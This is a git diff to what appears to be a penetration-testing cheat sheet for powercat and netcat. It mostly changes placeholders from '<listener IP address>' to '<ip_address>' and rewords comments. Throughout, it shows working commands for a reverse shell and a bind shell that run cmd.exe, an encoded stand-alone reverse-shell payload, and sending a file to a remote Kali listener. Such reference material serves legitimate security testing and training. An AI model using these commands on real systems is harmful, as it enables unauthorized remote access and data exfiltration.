@@ -16,7 +16,7 @@ PS C:\> powercat -h
 $ sudo nc -lvp 443
 
 # Send a reverse shell via Powercat 
-PS C:\> powercat -c <listener IP address> -p 443 -e cmd.exe
+PS C:\> powercat -c <ip_address> -p 443 -e cmd.exe
 ```
 
 ```powershell
@@ -24,7 +24,7 @@ PS C:\> powercat -c <listener IP address> -p 443 -e cmd.exe
 PS C:\> powercat -l -p 443 -e cmd.exe
 
 # Use netcat to connect to the bind shell
-$ nc -nv <listener IP address> 443
+$ nc -nv <ip_address> 443
 ```
 
 ```powershell
@@ -32,15 +32,15 @@ $ nc -nv <listener IP address> 443
 PS C:\> powercat -c <listener IP address> -p 443 -e cmd.exe -g > reverseshell.ps1
 
 # Generate stand-alone encoded payload
-PS C:\> powercat -c <listener IP address> -p 443 -e cmd.exe -ge > encoded_reverseshell.ps1
+PS C:\> powercat -c <ip_address> -p 443 -e cmd.exe -ge > encoded_reverseshell.ps1
 
 PS C:\> powershell -E <content from encoded_reverseshell.ps1>
 ```
 
 ```powershell
-# Set up a listener to receive a file from remote host
-$ nc -nlvp > file 
+# Set up a netcat listener on Kali Linux to receive a file from a remote Windows host
+$ nc -nlvp <port> > file.txt
 
-# Use powercat to connect to a listener and transfer a file 
-PS C:\> powercat -c <listener IP Address> -p <listener port> -i  <File Full location>
+# Use powercat to transfer a file to a remote Kali Linux listener 
+PS C:\> powercat -c <ip_address> -p <port> -i <file_location>
 ```
